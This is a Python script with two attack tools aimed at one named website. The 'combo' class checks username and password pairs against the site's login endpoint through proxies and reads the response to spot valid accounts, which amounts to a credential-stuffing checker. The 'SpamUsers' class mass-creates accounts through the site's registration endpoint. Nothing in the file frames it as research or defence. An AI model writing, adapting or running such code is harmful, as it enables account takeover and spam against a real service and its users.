try:    
    import requests
except Exception as E:
    print("error: "+str(E))



class combo(): 
    def __init__(self):
        self.url=str("https://ba9chich.com/requests/login.php")
        self.headers={
            "Host": "ba9chich.com",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Length": "29",
            "Origin": "https://ba9chich.com",
            "DNT": "1",
            "Connection": "keep-alive",
            "Referer": "https://ba9chich.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
            }

    def guess(self,identifier,password,proxies):
        invalid_message='There is no user with these details! You do not have an account? Click <a href="https://ba9chich.com/">HERE</a> to create an account.'
        valid_message='go_inside'
        headers=self.headers

        payload={
                "username":identifier,
                "password":password
                }
        try:
            req=requests.post(self.url,data=payload,headers=headers,proxies=proxies)
            response=str(req.text)
            response_code=req.status_code

            if(response_code==200 and invalid_message in response):
                return False
            elif(response_code==200 and valid_message in response and (invalid_message not in response)):
                return True
            else:
                print(response)
                return False

        except KeyboardInterrupt:
            exit()
        except Exception as e:
            print(f"error: {e}")

    def check(self):
        try:
            req=requests.get(self.url)
            if req.status_code!=404:
                return 1
            else:
                return 0

        except KeyboardInterrupt:
            pass
        except Exception as E:
            print(f"error: {E}")




class SpamUsers:
    def __init__(self) :
        self.HEADERS={
            "authority":"ba9chich.com",
            "method":"POST",
            "path":"/requests/register.php",
            "scheme":"https",
            "Accept":"*/*",
            "Accept-Encoding":"gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Length": "64",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ba9chich.com",
            "Referer": "https://ba9chich.com/inscription",
            "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            "Sec-Ch-Ua-Mobile": '?0',
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": 'empty',
            "Sec-Fetch-Mode": 'cors',
            "Sec-Fetch-Site": 'same-origin',
            "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        }
        self.URL="https://ba9chich.com/requests/register.php"

    def startSpam(self,username,email,password):
        payload={"uusername": username,
        "y_email": email,
        "y_password": password}
        try:
            req=requests.post(self.URL,data=payload,headers=self.HEADERS)
            if req.status_code == 200 and int(str(req.text).replace("\n","")) == 8:
                return 1
            else:
                return 0
        except:
            return 0

